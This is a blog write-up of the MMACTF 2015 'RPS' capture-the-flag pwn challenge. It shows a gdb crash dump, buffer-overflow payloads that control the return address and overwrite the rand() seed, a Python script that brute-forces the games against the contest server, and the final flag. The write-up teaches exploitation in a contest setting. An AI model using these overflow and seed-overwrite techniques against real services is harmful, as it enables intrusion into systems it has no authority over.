---
layout: post
title: "Write up | MMACTF 2015 - Pwn - RPS"
date: 2015-09-09 15:14:40 +0000
comments: true
categories: 
---

~~~
Problem
Win 50 games in a row!
nc milkyway.chal.mmactf.link 1641
~~~
[rps.7z](http://assets.score.mmactf.link/attachments/rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e)

Try to overflow the input, I discover that with payload `'1' * 88 + myaddr` , I can control the EIP to myaddr

```
gdb-peda$ r < data
Starting program: /root/MMACTF/rps/rps < data
What's your name: Hi, 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111114321ABCD
Let's janken
Game 1/50
Rock? Paper? Scissors? [RPS]Bye bye

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7b13f60 (<__write_nocancel+7>:      cmp    rax,0xfffffffffffff001)
RDX: 0x0
RSI: 0x7ffff7dd7780 --> 0x0
RDI: 0x7ffff7dd6620 --> 0xfbad2a84
RBP: 0x3131313131313131 ('11111111')
RSP: 0x7fffffffea78 ("4321ABCD")
RIP: 0x400ae2 (<main+732>:      ret)
R8 : 0x7ffff7dd7780 --> 0x0
R9 : 0x7ffff7fed700 (0x00007ffff7fed700)
R10: 0x355
R11: 0x246
R12: 0x400710 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffeb50 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ad7 <main+721>: call   0x4006e0 <fflush@plt>
   0x400adc <main+726>: mov    eax,0x0
   0x400ae1 <main+731>: leave
=> 0x400ae2 <main+732>: ret
   0x400ae3:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400aed:    nop    DWORD PTR [rax]
   0x400af0 <__libc_csu_init>:  push   r15
   0x400af2 <__libc_csu_init+2>:        mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffea78 ("4321ABCD")
0008| 0x7fffffffea80 --> 0x7fffffffeb00 --> 0x7fffffffeb58 --> 0x7fffffffed88 ("/root/MMACTF/rps/rps")
0016| 0x7fffffffea88 --> 0x7fffffffeb58 --> 0x7fffffffed88 ("/root/MMACTF/rps/rps")
0024| 0x7fffffffea90 --> 0x100000000
0032| 0x7fffffffea98 --> 0x400806 (<main>:      push   rbp)
0040| 0x7fffffffeaa0 --> 0x0
0048| 0x7fffffffeaa8 --> 0xe764facb54c92eb8
0056| 0x7fffffffeab0 --> 0x400710 (<_start>:    xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400ae2 in main ()
```

But, the address of line printing "Congrats" message contains **\x0a** character.
It is changed to other character when I push to the program.
I also try injecting shellcode to postfix, but it doesn't work too.

> Make it simple !

What about rand() ? Is it safe perfectly ?


I pay attention to `seed` of rand function. Seem like it can be overflowed too :)


Using gdb, i have where the name stored in memory

![name's address](http://i.imgur.com/VjgdeOA.png)

=> `$bp-0x50`

And `...seed`

![seed's address](http://i.imgur.com/j93EyWq.png)

=> `$bp-0x20`

Calculate the length of payload:
```
0x50 - 0x20 = 0x30 ~ 48
```

So,
```
seed = 'AAAA'
payload = 'A' * 48 + seed
```

Keep the `seed`, we try to brute force the result.
I use this code:
```
#!/usr/bin/env python 2.7

import socket
import telnetlib
import struct

p = lambda x: struct.pack("I", x)
P = lambda x: struct.unpack("I", x)
q = lambda x: struct.pack("<Q", x)

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def r_until(st, debug=False):
    ret = ""
    while st not in ret:
        lret = s.recv(8192)
        if debug and len(lret) > 0:
            print lret
        ret += lret
    return ret

def tryluck(s, c):
    s.send(c + '\n')
    result = s.recv(1024)    
    if 'win' in result:
        return True
    return False

if __name__ == '__main__':
    correctAnswer = []
    guessAnswer = 0                                     # 0 for R, 1 for P, 2 for S 
    for sessionID in range(0, 1000):        
        s = socket.create_connection(('milkyway.chal.mmactf.link', '1641'))
        print r_until(':')
        name = "A" * 52                                 # 48 + 4    
        s.send(name + '\n')            
        gameID = 0    
        while True:          
            print '[+] sessionID:', sessionID, '        gameID:', (gameID+1)
            print '[+] correctAnswer', correctAnswer                        
            print r_until(']', debug=True)

            if gameID + 1 <= len(correctAnswer):        # I have saved result for this game
                s.send(correctAnswer[gameID] + '\n')
                result = s.recv(1024)
                print '[+] Result:', result            
            else:                                       # no result for this game exists
                if guessAnswer == 0:
                    answer = 'S'
                elif guessAnswer == 1:
                    answer = 'R'
                else:
                    answer = 'P'

                if not tryluck(s, answer):
                    guessAnswer += 1                    # choose another answer
                    break     

                correctAnswer.append(answer)            # win, record the answer
                guessAnswer = 0                                                        

            gameID += 1
```

Get flag: `MMA{treed_three_girls}`